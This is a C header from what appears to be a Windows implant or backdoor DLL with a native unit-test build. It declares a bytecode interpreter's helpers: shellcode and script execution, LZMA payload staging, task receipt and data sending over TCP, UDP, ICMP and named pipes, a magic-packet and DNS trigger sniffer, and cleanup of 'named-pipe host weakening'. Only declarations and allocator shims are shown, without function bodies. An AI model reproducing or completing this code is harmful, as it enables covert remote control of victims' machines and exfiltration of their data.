#ifndef SW_IMPL_H
#define SW_IMPL_H

/* Internal declarations shared by the Windows-only TU (sw_win32.c) and
 * by the native unit tests (which link sw_stub.c instead). sw_core.h
 * already declares the pure-C entry points; this header exists so the
 * bytecode TU can call the networking / staging / trigger helpers and
 * the worker without pulling windows.h.
 */

#include "sw_core.h"
#include <stdint.h>
#include <stddef.h>

#ifdef _WIN32
#  include <windows.h>
#else
/*
 * Host (native unit-test) build.  Only the small set of Windows API
 * shims sw_bytecode.c actually references are provided here:
 *   - HeapAlloc / HeapFree  ->  malloc / free
 *   - InterlockedExchange   ->  __sync_lock_test_and_set
 *   - CreateThread          ->  direct call to the thread proc
 *     (used only by sw_spawn_thread_run which routes through the
 *     ThreadProc_trampoline that runs inline.)
 *
 * sw_stub.c provides the bodies of the networking / staging / trigger /
 * worker helpers that the bytecode TU calls.
 */
#  include <unistd.h>
#  include <time.h>
#  include <stdatomic.h>
#  include <stdlib.h>

#  define HeapAlloc(h, f, s)  malloc(s)
#  define HeapFree(h, f, p)   free(p)
#  define HEAP_ZERO_MEMORY    0

static inline LONG sw_interlocked_exchange(volatile LONG *p, LONG v) {
    return __sync_lock_test_and_set(p, v);
}
#  define InterlockedExchange(p, v)  (sw_interlocked_exchange((volatile LONG*)(p), (v)))
#endif

/* Heap allocation.
 *
 * On Windows the DLL is linked with mingw `-static -static-libgcc`, which
 * gives it a private CRT heap. Calling the CRT's malloc()/free() from that
 * heap can corrupt under the host process's heap context (this is the
 * DECOMPRESS_RUN crash). Route all DLL allocations through the process heap
 * instead. On the native (unit-test) build, map to the CRT allocators. */
#ifdef _WIN32
static inline void *sw_malloc(size_t n) { return HeapAlloc(GetProcessHeap(), 0, n); }
static inline void *sw_calloc(size_t n, size_t sz) {
    if (n && sz > (size_t)-1 / n) return NULL;
    return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, n * sz);
}
static inline void  sw_free(void *p) { if (p) HeapFree(GetProcessHeap(), 0, p); }
#else
static inline void *sw_malloc(size_t n) { return malloc(n); }
static inline void *sw_calloc(size_t n, size_t sz) { return calloc(n, sz); }
static inline void  sw_free(void *p) { free(p); }
#endif

#ifdef SW_DEBUG
/* Debug logging to sw_debug.log (Windows DLL build only). Append-only. */
void sw_dbg(const char *fmt, ...);
#else
#define sw_dbg(...) ((void)0)
#endif

/* Shared globals (sw_core.c on both builds). */
extern volatile LONG sw_stop_flag;
extern uint8_t  sw_stage_arena[SW_STAGE_ARENA_SIZE];
extern uint32_t sw_stage_arena_len;

/* Randomness (sw_core.c on native; sw_win32.c on Windows). */
uint32_t sw_random_u32(void);

/* Networking / staging / trigger / worker declarations appear below under
 * #ifdef _WIN32 or in the host shims. The shared helpers the bytecode TU
 * actually calls (declared in sw_bytecode.c) are:
 *
 *   uintptr_t sw_spawn_thread_run(const uint8_t *code, uint32_t len);
 *   int       sw_run_bytecode(const uint8_t *code, uint32_t len);
 */
uintptr_t sw_spawn_thread_run(const uint8_t *code, uint32_t len);

/* Networking (sw_win32.c on Windows; sw_stub.c on native). */
int sw_tcp_send      (const char *la, const char *lp,
                      const char *rh, const char *rp,
                      const uint8_t *blob, uint32_t blen, uint16_t dl);
int sw_udp_send      (const char *la, const char *lp,
                      const char *rh, const char *rp,
                      const uint8_t *blob, uint32_t blen, uint16_t dl);
int sw_icmp_send     (const char *src, const char *dst,
                      const uint8_t *blob, uint32_t blen, uint16_t dl);
int sw_pipe_send     (const char *server, const char *pipe,
                      const char *user, const char *pass,
                      const uint8_t *blob, uint32_t blen, uint16_t dl);
int sw_tcp_connect_recv(const char *la, const char *lp,
                        const char *rh, const char *rp, uint16_t dl,
                        uint8_t *task, uint32_t cap, uint32_t *tlen);
int sw_tcp_listen_recv(const char *a, const char *b, uint16_t dl,
                        uint8_t *task, uint32_t cap, uint32_t *tlen);
int sw_udp_bind_recv  (const char *a, const char *b, uint16_t dl,
                        uint8_t *task, uint32_t cap, uint32_t *tlen);
int sw_pipe_client_recv(const char *server, const char *pipe,
                        const char *user, const char *pass, uint16_t dl,
                        uint8_t *task, uint32_t cap, uint32_t *tlen);
int sw_pipe_server_recv(const char *pipe, const char *reserved, uint16_t dl,
                        uint8_t *task, uint32_t cap, uint32_t *tlen);

/* Staging / exec helpers (sw_win32.c on Windows; sw_stub.c on native). */
int sw_run_shellcode  (const uint8_t *code, uint32_t len);
int sw_run_file_script(const char *path);
int sw_lzma_decompress(const uint8_t *props, const uint8_t *comp,
                       uint32_t comp_len, uint8_t *out, uint32_t out_cap);

/* Trigger (sw_win32.c on Windows; sw_stub.c on native).
 *
 * The sniff mode mirrors the two trigger opcodes:
 *   SW_SNIFF_RAW      (0x87) - raw magic-packet trigger only
 *   SW_SNIFF_RAW_DNS  (0x88) - raw magic-packet AND DNS triggers */
enum {
    SW_SNIFF_RAW     = 1,
    SW_SNIFF_RAW_DNS = 2
};
int sw_sniff_magic(const char *iface, uint32_t deadline_seconds,
                   int mode, int depth);

/* Undo the named-pipe host weakening (sw_net.c). */
void sw_namedpipe_cleanup(void);

/* Worker (sw_win32.c on Windows; sw_stub.c on native). */
int  sw_worker_start(void);

/* Trampoline for SPAWN_THREAD_SCRIPT (sw_bytecode.c; used by both
 * builds to fire the child interpreter thread).
 *
 * On Windows this is a LPTHREAD_START_ROUTINE (LPVOID = void *). On the
 * native unit-test path LPVOID is not defined, so declare with void *.
 */
#ifdef _WIN32
uintptr_t ThreadProc_trampoline(LPVOID arg);
#else
uintptr_t ThreadProc_trampoline(void *arg);
#endif

#endif
